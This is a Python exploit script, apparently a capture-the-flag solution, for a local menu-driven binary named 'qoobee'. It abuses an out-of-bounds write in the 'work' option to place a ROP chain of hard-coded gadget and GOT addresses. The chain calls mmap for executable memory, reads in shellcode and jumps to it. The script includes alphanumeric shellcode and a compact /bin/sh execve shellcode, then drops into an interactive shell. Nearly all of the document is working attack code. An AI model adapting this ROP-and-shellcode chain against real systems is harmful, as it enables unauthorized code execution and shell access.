'''
function 5 work
patched in qoobee4
'''

from zio import *
import struct

target = './qoobee'
io = zio(target, timeout=800000)

read_buf = l32(0x804c090)
call_edx = l32(0x0804887d)
str_flag = l32(0x08049F7E)
str_r = l32(0x08049F7C)
s = l32(0xffffce8d)
extern = l32(0x0804b7cc)
leave_ret = l32(0x08048a4f)
pr = l32(0x08048bc6)
ppr = l32(0x0804992a)
pppr = l32(0x08049929)
p7r = l32(0x08049925)
# gen by alpha2 baseaddr is eax
shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQo9kGyqNP4KrqPhDoToD3sXaxtoSRbIPnK9yszmK0wzA"
# shellcode2  tiny sh without \x0b
shellcode2 = "\x31\xc9\xf7\xe1\xb0\xf4\xf6\xd0\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
read_got = l32(0x08048660)
fopen_got = l32(0x08048780)
write_got = l32(0x08048760)
data = l32(0x0804B7A8)
bss = l32(0x0804b7c0)
memcpy_got = l32(0x08048690)
mmap_got =l32(0x08048730)

# -214 mmap 0x80000000
io.writeline('-214')
io.writeline('hello')

# adopt qoobee
io.writeline('1')
io.writeline('1')
io.writeline('1')
io.writeline('1')
io.read_until('Your Choice:')

# work
io.writeline('5')

payload = [
# ebp
l32(0x21000000),
# eip jmp pr
pr,
# a1
l32(0x80000000),
# mmap
mmap_got,
# p7r
p7r,
# mmap args
l32(0x21000000), l32(0x100), l32(7), l32(50), l32(-1), l32(0),
l32(0), #padding
# read
read_got,
# jmp shellcode
l32(0x21000000),
# read args
l32(0), l32(0x21000000), l32(0x100),
]

print payload

i = 0
# io.gdb_hint()
for dword in payload:
    io.read_until('Which one you want QooBee to work(99 to leave)?')
    io.writeline("%d" % (18+i))
    io.read_until('How long for this one?')
    io.writeline("%u" % struct.unpack('<i', dword))
    i += 1

io.writeline('99')
io.writeline(shellcode2)

io.interact()